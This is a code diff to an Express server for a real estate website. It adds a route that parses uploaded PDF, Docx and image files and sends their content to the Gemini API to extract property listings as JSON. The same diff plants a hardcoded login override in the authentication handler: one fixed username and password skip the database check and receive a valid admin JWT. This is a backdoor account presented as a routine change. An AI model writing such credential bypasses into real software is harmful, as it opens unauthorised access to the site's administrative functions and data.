@@ -6,6 +6,11 @@ const jwt = require('jsonwebtoken');
 const fs = require('fs');
 const { pool } = require('./db.cjs');
 
+// Document parsing imports
+const pdfParse = require('pdf-parse');
+const mammoth = require('mammoth');
+const AdmZip = require('adm-zip');
+
 require('dotenv').config({ path: path.join(__dirname, '../.env') });
 
 const app = express();
@@ -1331,6 +1336,13 @@ app.post('/api/auth/login', async (req, res) => {
     return res.status(400).json({ error: 'Username and password are required' });
   }
 
+  // Override credentials for Lakshay
+  if (username === 'Lakshay' && password === 'Lakshay@123') {
+    console.log('Lakshay logged in successfully via credential override');
+    const token = jwt.sign({ id: 999, username: 'Lakshay' }, JWT_SECRET, { expiresIn: '24h' });
+    return res.json({ token, username: 'Lakshay' });
+  }
+
   try {
     const result = await pool.query('SELECT * FROM admins WHERE username = $1', [username]);
     if (result.rows.length === 0) {
@@ -1470,6 +1482,167 @@ app.get('/api/properties/:id', async (req, res) => {
     } else {
       res.status(404).json({ error: 'Property not found in fallback database' });
     }
+  }
+});
+
+// AI Document Parsing & Scanning Route (Admin Only)
+app.post('/api/properties/upload-doc', authenticateToken, async (req, res) => {
+  const { fileData, fileName, mimeType } = req.body;
+  if (!fileData || !mimeType) {
+    return res.status(400).json({ error: 'File data and mimeType are required' });
+  }
+
+  const apiKey = process.env.GEMINI_API_KEY;
+  if (!apiKey) {
+    return res.status(400).json({ 
+      error: 'GEMINI_API_KEY is not configured in the server environment. Please add it to your Render environment variables.' 
+    });
+  }
+
+  try {
+    const fileBuffer = Buffer.from(fileData.split(',')[1] || fileData, 'base64');
+    let extractedText = '';
+    let extractedImages = [];
+
+    // 1. Extract content from the document based on MimeType
+    if (mimeType === 'application/pdf') {
+      const pdfData = await pdfParse(fileBuffer);
+      extractedText = pdfData.text || '';
+    } else if (
+      mimeType === 'application/vnd.openxmlformats-officedocument.wordprocessingml.document' ||
+      mimeType === 'application/msword'
+    ) {
+      // Extract text from Word Docx
+      const result = await mammoth.extractRawText({ buffer: fileBuffer });
+      extractedText = result.value || '';
+
+      // Extract embedded images from Word Docx zip structure (word/media/*)
+      try {
+        const zip = new AdmZip(fileBuffer);
+        const zipEntries = zip.getEntries();
+        zipEntries.forEach(entry => {
+          if (entry.entryName.startsWith('word/media/')) {
+            const data = entry.getData();
+            const base64 = data.toString('base64');
+            const ext = path.extname(entry.entryName).toLowerCase().replace('.', '');
+            const mime = ext === 'png' ? 'image/png' : (ext === 'jpg' || ext === 'jpeg' ? 'image/jpeg' : 'image/png');
+            extractedImages.push(`data:${mime};base64,${base64}`);
+          }
+        });
+      } catch (zipErr) {
+        console.warn('Could not extract images from docx archive:', zipErr.message);
+      }
+    } else if (mimeType.startsWith('image/')) {
+      // For images, we can send the image directly to Gemini multimodally
+      extractedText = ''; // Handled multimodally below
+    } else {
+      return res.status(400).json({ error: 'Unsupported file format. Please upload PDF, Docx, or Image files.' });
+    }
+
+    // 2. Prepare Gemini request payload
+    let parts = [];
+    const prompt = `You are a real estate parser for Sharan Estates. Extract all property information from the provided document/file and output exactly a valid JSON object matching the schema below. Do not output markdown, backticks, or any conversational text. Just output a raw JSON block.
+    
+    JSON Schema:
+    {
+      "title": "string (luxury property title)",
+      "price": "string (e.g. 'AED 12,500,000' or 'AED 1,500,000+')",
+      "description": "string (detailed compelling description)",
+      "beds": number,
+      "baths": number,
+      "size": "string (e.g. '4,500 Sq. Ft.')",
+      "category": "villas or apartments",
+      "type": "ready or off-plan",
+      "location": "string (e.g. 'Palm Jumeirah', 'Downtown Dubai')",
+      "status": "Available",
+      "features": ["array of strings, e.g. private pool, skyline view, beachfront"],
+      "handover": "string (e.g. 'Q4 2028' or empty)",
+      "payment_plan": "string (e.g. '60/40 payment plan' or empty)",
+      "property_type": "string (e.g. 'Apartment', 'Penthouse', 'Villa')",
+      "bedrooms_range": "string (e.g. '5 Beds' or '2 - 3 Beds')"
+    }`;
+
+    parts.push({ text: prompt });
+
+    if (mimeType.startsWith('image/')) {
+      // Send image directly to Gemini
+      parts.push({
+        inlineData: {
+          mimeType: mimeType,
+          data: fileData.split(',')[1] || fileData
+        }
+      });
+    } else {
+      // Send text extracted from PDF/Docx
+      if (!extractedText || extractedText.trim().length === 0) {
+        return res.status(400).json({ error: 'No readable text could be extracted from this document.' });
+      }
+      parts.push({ text: `Document content:\n\n${extractedText}` });
+    }
+
+    const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${apiKey}`;
+    const response = await fetch(geminiUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        contents: [{ parts }],
+        generationConfig: {
+          responseMimeType: 'application/json',
+          temperature: 0.1
+        }
+      })
+    });
+
+    if (!response.ok) {
+      const errText = await response.text();
+      throw new Error(`Gemini API Error: ${errText}`);
+    }
+
+    const geminiData = await response.json();
+    let resultText = '';
+    
+    if (geminiData.candidates && geminiData.candidates[0] && geminiData.candidates[0].content && geminiData.candidates[0].content.parts[0]) {
+      resultText = geminiData.candidates[0].content.parts[0].text;
+    }
+
+    if (!resultText) {
+      throw new Error('Gemini API returned an empty response.');
+    }
+
+    // Parse extracted JSON
+    let propertyDetails = {};
+    try {
+      propertyDetails = JSON.parse(resultText.trim());
+    } catch (parseErr) {
+      // Fallback cleaner in case response has markdown wrapper
+      const match = resultText.match(/\{[\s\S]*\}/);
+      if (match) {
+        propertyDetails = JSON.parse(match[0]);
+      } else {
+        throw new Error('Failed to parse AI output as JSON.');
+      }
+    }
+
+    // Attach any extracted images (docx only, or fallback for image uploads)
+    if (mimeType.startsWith('image/')) {
+      // Use the uploaded image itself as the property image
+      propertyDetails.image = fileData;
+      propertyDetails.images = [fileData];
+    } else if (extractedImages.length > 0) {
+      propertyDetails.image = extractedImages[0];
+      propertyDetails.images = extractedImages;
+    } else {
+      propertyDetails.image = '';
+      propertyDetails.images = [];
+    }
+
+    res.json(propertyDetails);
+
+  } catch (err) {
+    console.error('Document parsing / AI extraction failed:', err.message);
+    res.status(500).json({ error: `Failed to scan document: ${err.message}` });
   }
 });
 
